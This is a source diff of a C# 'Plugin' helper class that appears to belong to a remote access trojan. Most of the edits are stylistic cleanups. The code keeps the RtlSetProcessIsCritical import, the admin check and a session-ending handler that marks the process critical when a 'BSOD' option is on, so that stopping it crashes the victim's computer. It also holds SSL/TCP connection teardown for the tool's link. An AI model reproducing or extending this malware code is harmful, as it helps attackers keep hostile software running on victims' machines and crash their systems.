@@ -1,14 +1,9 @@
-﻿using Microsoft.Win32;
-using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.IO;
-using System.IO.Compression;
-using System.Linq;
+﻿using System;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
+using Microsoft.Win32;
 
 namespace Plugin
 {
@@ -17,10 +12,11 @@ namespace Plugin
         private const string Alphabet = "abcdefghijklmnopqrstuvwxyz";
 
         public static Random Random = new Random();
+
         public static string GetRandomString(int length)
         {
-            StringBuilder randomName = new StringBuilder(length);
-            for (int i = 0; i < length; i++)
+            var randomName = new StringBuilder(length);
+            for (var i = 0; i < length; i++)
                 randomName.Append(Alphabet[Random.Next(Alphabet.Length)]);
 
             return randomName.ToString();
@@ -36,7 +32,9 @@ namespace Plugin
                 Connection.SslClient?.Close();
                 Connection.TcpClient?.Close();
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         public static bool IsAdmin()
@@ -55,7 +53,7 @@ namespace Plugin
 
         public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
         {
-            if (Convert.ToBoolean(Plugin.BSOD) && Methods.IsAdmin())
+            if (Convert.ToBoolean(Plugin.BSOD) && IsAdmin())
                 ProcessCriticalExit();
         }
 
@@ -67,14 +65,11 @@ namespace Plugin
             }
             catch
             {
-                while (true)
-                {
-                    Thread.Sleep(100000); //prevents a BSOD on exit failure
-                }
+                while (true) Thread.Sleep(100000); //prevents a BSOD on exit failure
             }
         }
 
         [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
+        private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
     }
 }
